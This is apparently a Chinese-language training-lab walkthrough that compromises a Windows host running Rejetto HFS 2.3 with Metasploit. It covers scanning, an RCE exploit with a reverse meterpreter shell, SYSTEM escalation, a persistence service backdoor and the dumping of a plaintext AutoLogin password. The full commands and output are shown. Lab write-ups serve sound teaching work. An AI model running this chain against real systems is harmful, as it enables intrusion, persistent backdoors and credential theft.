参考：[Windows Gather AutoLogin User Credential Extractor](https://www.rapid7.com/db/modules/post/windows/gather/credentials/windows_autologin/)

[Windows Gather AutoLogin User Credential Extractor - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/windows/gather/credentials/windows_autologin)

```
meterpreter > run post/windows/gather/credentials/windows_autologin

[*] Running against ATTACKDEFENSE on session 1
[+] AutoAdminLogon=1, DefaultDomain=ATTACKDEFENSE, DefaultUser=Administrator, DefaultPassword=hello_attackdefense
```

远程桌面服务连接不上。

```
root@INE:~# rdesktop -u Administrator -d ATTACKDEFENSE -p hello_attackdefense 10.0.20.141
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).
```

## 解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第 2 步：检查提供的机器/域是否可访问。

命令

```
ping demo.ine.local
```

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (10.0.31.96) 56(84) bytes of data.
64 bytes from demo.ine.local (10.0.31.96): icmp_seq=1 ttl=125 time=3.83 ms
64 bytes from demo.ine.local (10.0.31.96): icmp_seq=2 ttl=125 time=2.97 ms
64 bytes from demo.ine.local (10.0.31.96): icmp_seq=3 ttl=125 time=8.26 ms
64 bytes from demo.ine.local (10.0.31.96): icmp_seq=4 ttl=125 time=3.03 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 2.970/4.522/8.255/2.181 ms
```

提供的机器是可达的，我们也从中找到了目标的 IP 地址。

第 3 步：检查机器上打开的端口。

命令

```
nmap demo.ine.local
```

```
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 10:42 IST
Nmap scan report for demo.ine.local (10.0.31.96)
Host is up (0.0033s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

在机器上，端口 80 (HTTP)、135 (RPC)、139 (NetBios)、445 (SMB)、3389 (RDP) 是开放的。

我们可以对暴露的端口发起攻击。但首先，让我们检查一下可以公开访问的内容。在这种情况下，我们将以端口 80 为目标来查找正在运行的应用程序名称和版本。

第 4 步：在端口 80 上运行 Nmap 以查找有关目标服务器的所有可能信息。

命令

```
nmap -A -O -p 80 demo.ine.local
```

`-A:`启用操作系统检测、版本检测、脚本扫描和跟踪路由

`-O:`启用操作系统检测

`-p:`端口

```
root@INE:~# nmap -A -O -p 80 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 10:45 IST
Nmap scan report for demo.ine.local (10.0.31.96)
Host is up (0.0030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).                                                                                                                                   
Network Distance: 3 hops                                                                                                                                                                    
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                    
                                                                                                                                                                                            
TRACEROUTE (using port 443/tcp)                                                                                                                                                             
HOP RTT     ADDRESS
1   0.02 ms linux (10.10.16.1)
2   ...
3   3.29 ms demo.ine.local (10.0.31.96)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```

Target 在端口 80 上运行 HFS（HTTP 文件服务器）2.3。HFS 服务器托管一个文件并共享它。

现在，我们发现了一个正在运行的应用程序名称和版本。让我们看看它是否容易受到任何已知的公共漏洞的攻击。

第 5 步：我们将使用 searchsploit 搜索 hfs 2.3 应用程序的公共漏洞利用。

命令

```
searchsploit hfs 2.3
```

关于“searchsploit”

searchsploit 是一个 bash 脚本，可帮助查找服务、操作系统和应用程序的漏洞利用。

```
root@INE:~# searchsploit hfs 2.3
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                               | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                               | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                            | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                       | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                       | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                  | windows/webapps/34852.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

我们收到的输出表明 hfs 2.3 服务器易受远程命令执行 (RCE) 的影响

第 6 步：运行 Metasploit 框架并找到 Rejetto HFS 漏洞利用模块。

命令

```
msfconsole -q
search rejetto
```

```
root@INE:~# msfconsole -q
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

Rejetto HFS 2.3 版本有一个 Metasploit 漏洞利用模块。

我们已成功识别出正在运行的应用程序并发现了 hfs 服务器的漏洞。此外，还找到了漏洞利用模块。

第 7 步：使用 rejetto hfs 漏洞利用模块并检查所有可用选项。

命令

```
use exploit/windows/http/rejetto_hfs_exec
show options
```

```
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

我们需要设置“RHOSTS”（目标机器地址：IP 或 URL）。在这种情况下，它是： demo.ine.local 运行 hfs 应用程序的位置。

模块中默认提及端口 80，`windows/meterpreter/reverse_tcp`有效负载与“LHOST”和“LPORT”（本地机器 IP 地址和端口）一起设置，用于 Meterpreter shell 的反向连接。

注意：如果 LHOST 和 LPORT 值与您的实验室设置不匹配，请务必确保它们。并且，如果需要，请确保进行更改。

第 8 步：现在，设置目标信息，即“设置 RHOSTS”并利用 HFS 应用程序

命令

```
set RHOSTS demo.ine.local
exploit
```

```
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Using URL: http://0.0.0.0:8080/HpfB7tW
[*] Local IP: http://10.10.16.4:8080/HpfB7tW
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HpfB7tW
[*] Sending stage (175174 bytes) to 10.0.31.96
[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.0.31.96:49823 ) at 2022-07-31 11:00:55 +0530
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\sIfhohhJfSlDQt.vbs' on the target

meterpreter > 
```

我们已经使用 Metasploit 框架成功地利用了 HFS 服务器。

步骤 9：发现目标机器信息，例如当前用户、系统信息、arch 等。

命令

```
sysinfo
getuid
```

```
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

我们可以注意到目标正在运行一个 Windows 服务器，并且我们收到了一个具有管理员权限的 Meterpreter 会话。

第十步：我们可以在机器上获得“SYSTEM”（或“NT Authority”）权限

命令

```
getsystem
getuid
```

这`getsystem`是一个用于提权的meterpreter 命令。它使用预定义的方法来获得受感染机器上的最高权限（即 SYSTEM）。

`0`: 所有可用的技术

`1`：命名管道模拟（在内存/管理中）

`2`: 命名管道模拟 (Dropper/Admin)

`3`：令牌重复（在内存/管理中）

`4`: 命名管道模拟（RPCSS 变体）

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

我们可以注意到命名管道模拟技术被用来获得系统权限。

第 11 步：使用 Metasploit 框架使用`exploit/windows/local/persistence_service`本地漏洞利用模块维护访问权限。

使活动的meterpreter会话处于后台。并且，使用该`exploit/windows/local/persistence_service`模块，然后检查所有可用选项。

命令

```
background
use exploit/windows/local/persistence_service
show options
```

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```
msf6 exploit(windows/local/persistence_service) > show options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```

我们必须设置`SESSION`id（即 1）并利用它

命令

```
set SESSION 1
exploit
```

```
msf6 exploit(windows/local/persistence_service) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\HdnYKlSF.exe
[*] Creating service uEAZH
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20220731.1206/ATTACKDEFENSE_20220731.1206.rc
[*] Sending stage (175174 bytes) to 10.0.31.96
[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.0.31.96:49908 ) at 2022-07-31 11:12:07 +0530

meterpreter > 
```

该模块会生成一个恶意文件并上传到目标机器。然后，它使用相同的文件来创建持久服务。当服务启动时，它将运行上传的文件。结果，我们将收到一个meterpreter会话。

我们已经成功地在目标机器上安装了后门并收到了另一个meterpreter会话。

第 12 步：杀死所有活动的 Meterpreter 会话并使用 metasploit 处理程序验证已安装的后门。

Metasploit 处理程序：`exploit/multi/handler`

Metasploit 多处理器是我们在目标机器上植入的后门的监听器。

杀死所有的meterpreter会话

命令

```
background
sessions -K
```

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/local/persistence_service) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.16.4:4444 -> 10.0.31.96:49823  (10.0.31.96)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.16.4:4444 -> 10.0.31.96:49908  (10.0.31.96)

msf6 exploit(windows/local/persistence_service) > sessions -K
[*] Killing all sessions...
[*] 10.0.31.96 - Meterpreter session 1 closed.
[*] 10.0.31.96 - Meterpreter session 2 closed.
msf6 exploit(windows/local/persistence_service) > sessions -l

Active sessions
===============

No active sessions.
```

启动 Metasploit 处理程序以接收新的 Meterpreter 会话。

命令

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.2
set LPORT 4444
exploit
```

注意：我们需要使用与后门相同的信息来接收多处理器上的新meterpreter 会话。我们无法更改有效负载、IP 或端口详细信息。在您的情况下，LHOST IP（本地机器 IP）地址将与本手册不同。请确保您设置了有效的 LHOST IP。

```
msf6 exploit(windows/local/persistence_service) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.4
LHOST => 10.10.16.4
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Sending stage (175174 bytes) to 10.0.31.96
[*] Meterpreter session 3 opened (10.10.16.4:4444 -> 10.0.31.96:49946 ) at 2022-07-31 11:20:14 +0530

meterpreter > 

```

我们收到了一个新的 Meterpreter 会话。该服务每 5 秒尝试连接到攻击者机器失败。因此我们收到了一个meterpreter shell。基于服务的持久性后门非常稳定。

第 13 步：我们将从目标机器转储 AutoLogin 信息。

我们将从目标机器中提取 AutoLogin 存储的凭据。之前，我们运行我们需要将当前进程迁移到 explorer.exe 的模块，以便我们可以完全控制该特定用户环境，即管理员用户。

命令

```
migrate -N explorer.exe
```

```
meterpreter > migrate -N explorer.exe
[*] Migrating from 4716 to 3648...
[*] Migration completed successfully.

```

该`-N`选项查找`explorer.exe`进程并将进程迁移到该进程中。

后台会话并运行 windows AutoLogin 凭据提取器后利用模块。

命令

```
background
use post/windows/gather/credentials/windows_autologin
set SESSION 3
exploit
```

```
meterpreter > background
[*] Backgrounding session 3...
msf6 exploit(multi/handler) > use post/windows/gather/credentials/windows_autologin
msf6 post(windows/gather/credentials/windows_autologin) > set SESSION 3
SESSION => 3
msf6 post(windows/gather/credentials/windows_autologin) > exploit

[*] Running against ATTACKDEFENSE on session 3
[+] AutoAdminLogon=1, DefaultDomain=ATTACKDEFENSE, DefaultUser=Administrator, DefaultPassword=hello_attackdefense
[*] Post module execution completed

```

AutoLogin 的密码以纯文本格式存储在注册表中。因此，我们能够倾倒它。

这些注册表用于在不输入用户名和密码的情况下自动登录到 Windows 机器（首次启动或重新启动）。

这就是我们如何使用 Metasploit 框架来利用易受攻击的机器。